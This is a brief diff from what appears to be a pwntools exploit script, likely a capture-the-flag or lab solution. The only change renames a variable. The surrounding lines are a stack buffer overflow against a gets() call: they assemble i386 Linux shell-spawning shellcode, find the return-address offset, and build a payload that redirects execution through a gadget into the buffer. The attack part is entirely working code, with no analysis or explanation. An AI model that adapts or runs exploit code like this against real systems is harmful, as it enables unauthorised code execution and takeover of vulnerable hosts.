@@ -29,10 +29,10 @@ log.info('ip: %08x', ip)
 log.info('sp: %08x', sp)
 p.close()
 
-x = (sp - 8) - 0x4c  # user buffer before call to gets()
+buf = (sp - 8) - 0x4c  # user buffer before call to gets()
 ip_off = cyclic_find(ip)
 sh = asm(shellcraft.i386.linux.sh())
-payload = fit({0: sh, ip_off: gadget_addr, ip_off + 4: x})
+payload = fit({0: sh, ip_off: gadget_addr, ip_off + 4: buf})
 
 p = s.system(args.BIN)
 p.recv()
